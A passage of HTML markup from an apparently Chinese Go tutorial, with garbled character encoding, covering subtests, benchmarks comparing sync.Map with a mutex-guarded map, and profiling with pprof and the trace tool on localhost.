TestDemo/æµ‹è¯•ç”¨ä¾‹2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ...&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// --- PASS: TestDemo (7.34s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;//     --- PASS: TestDemo/æµ‹è¯•ç”¨ä¾‹1 (7.13s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;//     --- PASS: TestDemo/æµ‹è¯•ç”¨ä¾‹2 (0.21s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo7.984s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1325&quot;&gt;&lt;span&gt;8.2 åŸºå‡†æµ‹è¯•&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;1327&quot;&gt;&lt;span&gt;ç®€å•çš„åŸºå‡†æµ‹è¯•ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1328&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å‹åŠ›æµ‹è¯•sync.Map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkSyncMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// go test -benchmem -run=^$ -bench ^(BenchmarkSyncMap)$ demo -v -count=1 -cpuprofile=cpu.profile -memprofile=mem.profile -benchtime=10s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap-4&lt;/span&gt;&lt;br/&gt;&lt;span&gt;//   570206     23047 ns/op      16 B/op       1 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo13.623s&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1361&quot;&gt;&lt;span&gt;å¯¹æ¯”åŸºå‡†æµ‹è¯•ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1362&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å‹åŠ›æµ‹è¯•sync.Map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkSyncMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ç”¨è¯»å†™é”å®ç°ä¸€ä¸ªå¹¶å‘map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; ConcurrentMap &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;value &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;&lt;br/&gt;mutex sync.RWMutex&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å†™&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(c *ConcurrentMap)&lt;/span&gt; &lt;span&gt;Store&lt;/span&gt;&lt;span&gt;(key &lt;span&gt;string&lt;/span&gt;, val &lt;span&gt;string&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;c.mutex.Lock()&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; c.mutex.Unlock()&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; c.value == &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;c.value = &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{}&lt;br/&gt;}&lt;br/&gt;c.value[key] = val&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// è¯»&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(c *ConcurrentMap)&lt;/span&gt; &lt;span&gt;Load&lt;/span&gt;&lt;span&gt;(key &lt;span&gt;string&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;c.mutex.Lock()&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; c.mutex.Unlock()&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; c.value[key]&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å‹åŠ›æµ‹è¯•å¹¶å‘map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkConcurrentMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;ConcurrentMap{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// go test -benchmem -run=^$ -bench . demo -v -count=1 -cpuprofile=cpu.profile -memprofile=mem.profile -benchtime=10s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap-4     668082     15818 ns/op      16 B/op       1 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkConcurrentMap&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkConcurrentMap-4         171730     67888 ns/op       0 B/op       0 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// coverage: 0.0% of statements&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo23.823s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1433&quot;&gt;&lt;span&gt;9. æ€§èƒ½åˆ†æ&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1435&quot;&gt;&lt;p data-line=&quot;1435&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šCPUåˆ†æã€å†…å­˜åˆ†æã€‚é€šè¿‡å¯è§†åŒ–è°ƒç”¨é“¾è·¯ã€å¯è§†åŒ–ç«ç„°å›¾ã€TOPå‡½æ•°ç­‰å¿«é€Ÿå®šä½ä»£ç é—®é¢˜ã€æå‡ä»£ç æ€§èƒ½ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1441&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1443&quot;&gt;&lt;span&gt;9.1 pprofçš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-line=&quot;1445&quot;&gt;&lt;span&gt;9.1.1 åŸºå‡†æµ‹è¯•åœºæ™¯&lt;/span&gt;&lt;/h3&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;é¦–å…ˆç¼–å†™åŸºå‡†æµ‹è¯•ç”¨ä¾‹ï¼Œå¤ç”¨ä¸Šé¢&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.Map&lt;/span&gt;&lt;/code&gt;&lt;span&gt;çš„ç”¨ä¾‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre&gt;&lt;code data-line=&quot;1449&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å‹åŠ›æµ‹è¯•sync.Map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkSyncMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&quot;2&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;æ‰§è¡ŒåŸºå‡†æµ‹è¯•ï¼Œç”Ÿæˆ&lt;/span&gt;&lt;code&gt;&lt;span&gt;cpu.profile&lt;/span&gt;&lt;/code&gt;&lt;span&gt;æ–‡ä»¶å’Œ&lt;/span&gt;&lt;code&gt;&lt;span&gt;mem.profileÂ &lt;/span&gt;&lt;/code&gt;&lt;span&gt;æ–‡ä»¶ã€‚å‘½ä»¤å¦‚ä¸‹&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;blockquote data-line=&quot;1473&quot;&gt;&lt;p data-line=&quot;1473&quot;&gt;&lt;span&gt;go test -benchmem -run=^&lt;span&gt;&lt;span&gt;&lt;semantics&gt;&lt;annotation encoding=&quot;application/x-tex&quot;&gt;-bench ^BenchmarkSyncMap&lt;/annotation&gt;&lt;/semantics&gt;&lt;/span&gt;&lt;span&gt;âˆ’&lt;/span&gt;benc&lt;span&gt;h&lt;span&gt;B&lt;/span&gt;&lt;/span&gt;enchma&lt;span&gt;r&lt;/span&gt;&lt;span&gt;k&lt;/span&gt;&lt;span&gt;S&lt;/span&gt;&lt;span&gt;y&lt;/span&gt;nc&lt;span&gt;M&lt;/span&gt;ap&lt;/span&gt;Â demo -v -count=1 -cpuprofile=cpu.profile -memprofile=mem.profile -benchtime=10s&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1475&quot;&gt;&lt;span&gt;å¸¸ç”¨å‚æ•°è§£é‡Šï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1477&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;-benchmem: è¾“å‡ºå†…å­˜æŒ‡æ ‡&lt;br/&gt;-run: æ­£åˆ™ï¼ŒæŒ‡å®šéœ€è¦testçš„æ–¹æ³•&lt;br/&gt;-bench: æ­£åˆ™ï¼ŒæŒ‡å®šéœ€è¦benchmarkçš„æ–¹æ³•&lt;br/&gt;-v: å³ä½¿æˆåŠŸä¹Ÿè¾“å‡ºæ‰“å°ç»“æœå’Œæ—¥å¿—&lt;br/&gt;-count: æ‰§è¡Œæ¬¡æ•°&lt;br/&gt;-cpuprofile: è¾“å‡ºcpuçš„profileæ–‡ä»¶&lt;br/&gt;-memprofile: è¾“å‡ºå†…å­˜çš„profileæ–‡ä»¶&lt;br/&gt;-benchtime: æ‰§è¡Œæ—¶é—´&lt;br/&gt;&lt;br/&gt;æ›´å¤šå‚æ•°è¯·æŸ¥çœ‹ï¼š&lt;br/&gt;go help testflag&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&quot;3&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;ä½¿ç”¨&lt;/span&gt;&lt;code&gt;&lt;span&gt;go tool&lt;/span&gt;&lt;/code&gt;&lt;span&gt;è‡ªå¸¦çš„pprofå·¥å…·åˆ†ææµ‹è¯•ç»“æœã€‚å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;blockquote data-line=&quot;1493&quot;&gt;&lt;p data-line=&quot;1493&quot;&gt;&lt;span&gt;go tool pprof -http=:8000 cpu.profile&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1495&quot;&gt;&lt;span&gt;å¸¸ç”¨å‚æ•°è§£é‡Šï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1497&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;-http: æŒ‡å®šip:portï¼Œå¯åŠ¨webæœåŠ¡å¯è§†åŒ–æŸ¥çœ‹åˆ†æï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æ‰“å¼€é¡µé¢ http://localhost:8000/ui/&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h5&gt;&lt;span&gt;å¯è§†åŒ–é€‰é¡¹èœå•:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.7283236994219653&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMetG4fHXdCkBIA8crAbx3wA49CtWwJdrzlGJRq72icPQBe4kpVfFFUKfA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;692&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;ç«ç„°å›¾:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.25925925925925924&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMerIbAJIJsp6pSB8N5lwmXh5Cgy038OMaRGa1Z0uXMM1viaLQmf8RASXw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;è°ƒç”¨é“¾è·¯å›¾:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.6777777777777778&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeeWp9tGndhicbckzI6dicuGpLt7jxT7iajrvGux1u4uB9vtOjzxwUGBulw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;Topå‡½æ•°:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;1.3231481481481482&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeDkrucVlMQM5yPVkxhRLFLrGDLJq63AJ3p8urgd66FS0icicfZfUCPhEA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h3 data-line=&quot;1513&quot;&gt;&lt;span&gt;9.1.2 WebæœåŠ¡åœºæ™¯&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;span&gt;1. ä½¿ç”¨ä¸Šé¢å…¨å±€å˜é‡çš„ä»£ç ç¤ºä¾‹ï¼Œå¼•å…¥&lt;/span&gt;&lt;code&gt;&lt;span&gt;net/http/pprof&lt;/span&gt;&lt;/code&gt;&lt;span&gt;åŒ…ï¼Œå¹¶å•ç‹¬æ³¨å†Œå„ç«¯å£è·å–pprofæ•°æ®ã€‚&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1517&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å¼•å…¥pprofåŒ…&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// _ä»£è¡¨åªæ‰§è¡ŒåŒ…å†…çš„initå‡½æ•°&lt;/span&gt;&lt;br/&gt;_ &lt;span&gt;&quot;net/http/pprof&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£é€»è¾‘&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;// å†å¼€å¯ä¸€ä¸ªç«¯å£è·å–pprofæ•°æ®&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;http.ListenAndServe(&lt;span&gt;&quot;:8888&quot;&lt;/span&gt;, &lt;span&gt;nil&lt;/span&gt;)&lt;br/&gt;}()&lt;br/&gt;&lt;span&gt;// å¯åŠ¨webæœåŠ¡&lt;/span&gt;&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span&gt;2. è®¿é—®é“¾æ¥Â &lt;/span&gt;&lt;code&gt;&lt;span&gt;http://localhost:8888/debug/pprof/&lt;/span&gt;&lt;/code&gt;&lt;span&gt;ï¼Œå¯ä»¥çœ‹è§ç›¸å…³profilesã€‚&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.4685185185185185&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeZKAoQzgnHibwAvjmrrDT9YW62VUliaicpQMMUVRJhsqHPxAK7nrNsUk6A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3. å‘½ä»¤ä½¿ç”¨pprofå·¥å…·ï¼Œè·å–è¿œç¨‹æœåŠ¡profileï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;blockquote data-line=&quot;1558&quot;&gt;&lt;p data-line=&quot;1558&quot;&gt;&lt;span&gt;go tool pprof -http=:8000Â http://localhost:8888/debug/pprof/profile?seconds=5&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1560&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;å¤‡æ³¨ï¼š&lt;br/&gt;æ‰§è¡Œä¸Šé¢å‘½ä»¤çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å‹æµ‹å·¥å…·æ¨¡æ‹Ÿæµé‡ï¼Œæ¯”å¦‚å‘½ä»¤ï¼šsiege -c 50 -t 100 &quot;http://localhost:8080/ping&quot;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1565&quot;&gt;&lt;span&gt;åŒæ ·ï¼Œæˆ‘ä»¬å¾—åˆ°äº†è¿™ä¸ªç†Ÿæ‚‰çš„é¡µé¢ï¼š&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.5388888888888889&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe09tZR4GIL1OG6JZgfictKgdW2WRibRfBO28VZxokO6tlrKJtHr3OwhXg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1571&quot;&gt;&lt;span&gt;9.2 traceå·¥å…·çš„ä½¿ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;1573&quot;&gt;&lt;span&gt;ä½œç”¨ï¼šæ¸…æ™°æŸ¥çœ‹æ¯ä¸ªé€»è¾‘å¤„ç†å™¨ä¸­Goroutineçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¯ä»¥å¾ˆç›´è§‚çœ‹å‡ºGoroutineçš„é˜»å¡æ¶ˆè€—ï¼ŒåŒ…å«&lt;/span&gt;&lt;span&gt;ç½‘ç»œé˜»å¡&lt;/span&gt;&lt;span&gt;ã€&lt;/span&gt;&lt;span&gt;åŒæ­¥é˜»å¡(é”)&lt;/span&gt;&lt;span&gt;ã€&lt;/span&gt;&lt;span&gt;ç³»ç»Ÿè°ƒç”¨é˜»å¡&lt;/span&gt;&lt;span&gt;ã€&lt;/span&gt;&lt;span&gt;è°ƒåº¦ç­‰å¾…&lt;/span&gt;&lt;span&gt;ã€&lt;/span&gt;&lt;span&gt;GCæ‰§è¡Œè€—æ—¶&lt;/span&gt;&lt;span&gt;ã€&lt;/span&gt;&lt;span&gt;GC STW(Stop The World)è€—æ—¶&lt;/span&gt;&lt;span&gt;ã€‚&lt;/span&gt;&lt;/p&gt;&lt;h3 data-line=&quot;1575&quot;&gt;&lt;span&gt;9.2.1 åŸºå‡†æµ‹è¯•åœºæ™¯&lt;/span&gt;&lt;/h3&gt;&lt;p data-line=&quot;1577&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1579&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;ç”Ÿæˆtrace.outæ–‡ä»¶å‘½ä»¤ï¼š&lt;/span&gt;&lt;span&gt;&lt;br/&gt;go test -benchmem -run=^$ -bench ^BenchmarkDemo_NoPool$ demo -v -count=1 -trace=trace.out &lt;br/&gt;go test -benchmem -run=^$ -bench ^BenchmarkDemo_Pool$ demo -v -count=1 -trace=trace.out &lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;span&gt;åˆ†ætrace.outæ–‡ä»¶å‘½ä»¤ï¼š&lt;/span&gt;&lt;span&gt;&lt;br/&gt;go tool trace -http=127.0.0.1:8000 trace.out&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h5&gt;&lt;span&gt;æ²¡ä½¿ç”¨sync.Pool:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.660056657223796&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMezLTZiaW2zdnZGXRTcRRLY3QekuLY0Gq90nIKTe5xpxzORJbIz8X50gQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;706&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.7356608478802993&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMerSxAZZliaWg1bfhibePZibNMeD3VpN9kqouvSic722EFKQ2VRAk4U15ibibw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;802&quot;/&gt;&lt;span&gt;Â &lt;/span&gt;&lt;img data-ratio=&quot;0.5259259259259259&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeUMicibRO6v7hTg65SyTVyOEKm8DibkA8Uq4Lfkiaia88wpDjicYlulVke6cA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;ä½¿ç”¨sync.Pool:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.562962962962963&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeCtCFHXXc4GXF9BpqYPUz7BB7llYje8pfT0dCiaRicHfWbsUasicyjL1gA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;9.2.2 WebæœåŠ¡åœºæ™¯&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;1603&quot;&gt;&lt;span&gt;ä½¿ç”¨ï¼š&lt;/span&gt;&lt;/p&gt;&lt;p 